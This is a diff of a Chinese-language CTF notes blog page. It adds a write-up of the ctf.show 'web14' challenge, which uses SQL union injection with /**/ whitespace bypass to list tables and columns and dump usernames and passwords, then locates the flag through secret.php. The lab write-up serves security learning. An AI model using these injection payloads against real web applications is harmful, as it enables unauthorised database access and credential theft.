@@ -40,6 +40,17 @@
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png">
@@ -53,7 +64,7 @@
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png">
 <meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png">
 <meta property="article:published_time" content="2024-02-20T07:41:29.000Z">
-<meta property="article:modified_time" content="2024-06-09T07:42:21.465Z">
+<meta property="article:modified_time" content="2024-07-08T02:14:42.330Z">
 <meta property="article:author" content="kingwempity">
 <meta property="article:tag" content="笔记">
 <meta property="article:tag" content="CTF">
@@ -610,8 +621,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-06-09 15:42:21</span>
-            <span class="mobile">2024-06-09 15:42:21</span>
+            <span class="desktop">2024-07-08 10:14:42</span>
+            <span class="mobile">2024-07-08 10:14:42</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -641,12 +652,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.4k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 Mins</span>
         </span>
     
     
@@ -759,6 +770,52 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
 </blockquote>
 <p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
+<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
+<p>SQL联合注入，GET请求方式</p>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">
+
+<blockquote>
+<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a class="link" href="mailto:&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112;">&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
+<blockquote>
+<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
+</blockquote>
+<blockquote>
+<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
+<blockquote>
+<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
+<blockquote>
+<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
+<blockquote>
+<p><u><strong>查询字段内容(查字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
+<blockquote>
+<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
+</blockquote>
+<blockquote>
+<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
+<blockquote>
+<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
 <h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
 <p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
 <hr>
@@ -837,7 +894,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-06-09 15:42:21
+                    :</strong> 2024-07-08 10:14:42
             </li>
         
         <li>
@@ -984,7 +1041,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">ctf.show_web</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-show%E7%A7%80"><span class="nav-number">1.</span> <span class="nav-text">CTF.show秀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web4"><span class="nav-number">1.1.</span> <span class="nav-text">Web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web5"><span class="nav-number">1.2.</span> <span class="nav-text">Web5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web7"><span class="nav-number">1.3.</span> <span class="nav-text">web7</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFHUB"><span class="nav-number">2.</span> <span class="nav-text">CTFHUB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">WEB_请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E9%A1%B5%E9%9D%A2%E9%9A%90%E8%97%8F"><span class="nav-number">2.2.</span> <span class="nav-text">信息页面隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E2%80%94%E2%80%94%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="nav-number">2.3.</span> <span class="nav-text">备份文件下载——网站源码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80"><span class="nav-number">2.3.1.</span> <span class="nav-text">常见的网站源码备份文件后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">2.3.2.</span> <span class="nav-text">常见的网站源码备份文件名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">Web_弱口令</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-show%E7%A7%80"><span class="nav-number">1.</span> <span class="nav-text">CTF.show秀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web4"><span class="nav-number">1.1.</span> <span class="nav-text">Web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web5"><span class="nav-number">1.2.</span> <span class="nav-text">Web5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web7"><span class="nav-number">1.3.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web14"><span class="nav-number">1.4.</span> <span class="nav-text">web14</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFHUB"><span class="nav-number">2.</span> <span class="nav-text">CTFHUB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">WEB_请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E9%A1%B5%E9%9D%A2%E9%9A%90%E8%97%8F"><span class="nav-number">2.2.</span> <span class="nav-text">信息页面隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E2%80%94%E2%80%94%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="nav-number">2.3.</span> <span class="nav-text">备份文件下载——网站源码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80"><span class="nav-number">2.3.1.</span> <span class="nav-text">常见的网站源码备份文件后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">2.3.2.</span> <span class="nav-text">常见的网站源码备份文件名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">Web_弱口令</span></a></li></ol>
 
     </div>
 </div>
@@ -1021,7 +1078,7 @@
                     </span>
                     
                         <span>
-                            49.7k words in total
+                            50k words in total
                         </span>
                     
                 </p>
